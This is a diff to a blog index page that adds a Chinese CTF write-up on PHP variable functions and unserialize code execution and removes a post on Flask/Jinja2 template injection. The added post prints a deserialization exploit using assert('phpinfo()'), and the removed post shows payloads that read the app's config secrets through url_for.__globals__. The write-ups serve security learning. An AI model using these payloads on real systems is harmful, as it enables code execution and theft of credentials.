@@ -169,6 +169,98 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php动态函数及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/09/php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  	<time datetime="2021-09-08T16:00:00.000Z" itemprop="datePublished">2021-09-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/09/php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        php动态函数及反序列化
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php动态函数及反序列化"><a href="#php动态函数及反序列化" class="headerlink" title="php动态函数及反序列化"></a>php动态函数及反序列化</h1><p>打开页面源码，发现有一个可疑的php文件，然后打开，发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="php动态函数"><a href="#php动态函数" class="headerlink" title="php动态函数"></a>php动态函数</h2><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=system&amp;$b=ls;$a($b);</span><br></pre></td></tr></table></figure>
+<p>而这里也是用了php动态函数的原理，然后我是想构造一个eval()函数的，发现不行，报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Call to undefined function eval() in</span><br></pre></td></tr></table></figure>
+<p>而查了官方文档后可知：eval属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用它，而这种语法构造的还有：echo、print、unset()、isset()、empty()、include、require等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">而system函数又被禁止了，所以我们可以使用assert()函数</span><br><span class="line"></span><br><span class="line">assert()</span><br></pre></td></tr></table></figure>
+<p>作用：检查一个断言是否为false</p>
+<p>注意：在php版本5到php版本7，assert()函数会将字符串当作是php代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以我们可以构造exp</span><br></pre></td></tr></table></figure>
+<?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this->a = "phpinfo()";
+        $this->b = "assert";
+    }
+    public function __destruct(){
+        $a = $this->a;
+        $b = $this->b;
+    }
+}
+$c = new HelloPhp();
+echo serialize($c);
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后get提交就好</span><br><span class="line"></span><br><span class="line">魔术方法</span><br></pre></td></tr></table></figure>
+__contruct()--------------------在类的对象实例化时被调用
+
+__destruct()--------------------在类的对象被销毁之前被调用
+```
+在题目中是在die(0)在退出脚本时调用了__destruct()魔术方法
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-smarty模板及X-Forwarded-For" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -933,93 +1025,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-flask之jinja2模板注入读取config文件" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/06/flask%E4%B9%8Bjinja2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96config%E6%96%87%E4%BB%B6/" class="article-date">
-  	<time datetime="2021-09-05T16:00:00.000Z" itemprop="datePublished">2021-09-06</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/06/flask%E4%B9%8Bjinja2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96config%E6%96%87%E4%BB%B6/">
-        flask之jinja2模板注入读取config文件
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="flask之jinja模板注入"><a href="#flask之jinja模板注入" class="headerlink" title="flask之jinja模板注入"></a>flask之jinja模板注入</h1><p>打开页面，我们可以看见源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">return open(__file__).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line">  def safe_jinja(s):</span><br><span class="line">    s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">    blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">    return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line">  return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">app.run(debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>我们可以看见一个函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask.render_template_string()</span><br></pre></td></tr></table></figure>
-<p>可知是模板注入，同时我们看见</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br></pre></td></tr></table></figure>
-<p>可以猜测注入点在/shrine/后面，因此我们可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>发现返回了49，可以确定这里是注入点，然后我们再看一行代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br></pre></td></tr></table></figure>
-<p>可以知道，在config文件中有flag的存在，而config文件是flask的全局变量，包含了所有应用程序的配置的信息，如：数据库链接字符串、连接第三方的凭证、SECRET_KEY等敏感值等</p>
-<p>但是源码中不仅过滤了(和）,而且还将config和self加入了黑名单，所以我们不能直接构造读取config信息，不过可以使用url_for()函数或get_flashed_messages()函数读取全局变量[‘current_app’]，而[‘current_app’]是指当前app，里面包含config</p>
-<p>可以使用以下代码，对过滤进行展示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def safe_jinja(s):</span><br><span class="line">    s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">    blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">    return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(safe_jinja(&quot;&#123;&#123;7*7&#125;&#125;&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>url_for</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">作用：</span><br><span class="line">1. 给指定的函数构造url</span><br><span class="line">2. 访问静态文件</span><br></pre></td></tr></table></figure>
-
-<p>get_flashed_message()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回之前在flask中通过flash()传入的闪现信息列表，把字符串对象表示的消息加入到一个消息列中，然后调用get_flashed_message()方法取出（闪现信息只可以取一次，而闪现信息中包含[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure>
-
-<p>然后我们可以先构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>得到所有的全局变量的信息，然后按ctrl+F来读取current_app，发现有，则直接构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>或者按上面的方式，使用get_flashed_messages()函数来读取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其实思路就是，由于过滤，无法直接使用来读取config，则直接说详细一点，读取当前应用程序下的config</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
 	</div>
 
       
